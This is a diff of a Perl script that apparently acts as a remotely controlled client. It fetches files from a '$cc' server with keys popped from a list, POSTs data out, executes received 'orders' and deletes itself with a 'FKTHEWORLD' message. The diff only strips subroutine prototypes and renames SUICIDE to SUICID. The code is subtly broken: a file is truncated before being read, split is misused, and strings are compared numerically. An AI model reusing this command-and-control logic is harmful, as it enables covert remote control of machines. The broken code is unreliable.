@@ -77,13 +77,13 @@ while (1)
   open($Wfh, '>', $DONE);
 }
 # SUB ##############################
-sub SUICIDE()
+sub SUICID
 {
   unlink $SUICIDE;
   my $xtime = TIME(); print "FKTHEWORLD $xtime\n";
   exit;
 }
-sub SLEEP()
+sub SLEEP
 {
   open(my $Sfh, '<', $SLEEP);
   my $timeout = readline $Sfh; chomp $timeout;
@@ -91,7 +91,7 @@ sub SLEEP()
   close $Sfh; unlink $SLEEP;
   sleep $timeout;
 }
-sub TIME()
+sub TIME
 {
   my $t = localtime;
   my $m = split(/\s+/, $t)[1]; my $d = split(/\s+/, $t)[2];
@@ -99,7 +99,7 @@ sub TIME()
   my $time = $m . '_' . $d . '_' . $h;
   return $time;
 }
-sub POST()
+sub POST
 {
   my $data = shift; my $key = popkrip();
   my $ua = useragent();
@@ -107,12 +107,12 @@ sub POST()
   $req->content($data);
   print "response $ua->request($req)->as_string\n";
 }
-sub WORD()
+sub WORD
 {
   my $key = popkrip(); my $ua = useragent();
   my $res = $ua->get("$cc/i/$key", ':content_file'=>$WORD);
 }
-sub Wread()
+sub Wread
 {
   my $key = shift;
   open($Rfh, '<', "$dump/$key");
@@ -134,14 +134,14 @@ sub Wread()
   if ($cmd == 'orders')
     { cp $WORD que/$value; }
 }
-sub popkrip()
+sub popkrip
 {
   open($Kfh, '>', $KEYS);
   my @list = readline $Kfh; chomp @list;
   my $key = shift @list; print $Kfh @list;
   close $Kfh; return $key;
 }
-sub useragent()
+sub useragent
 {
   my $ua = LWP::UserAgent->new(
 # AGENT ##########################
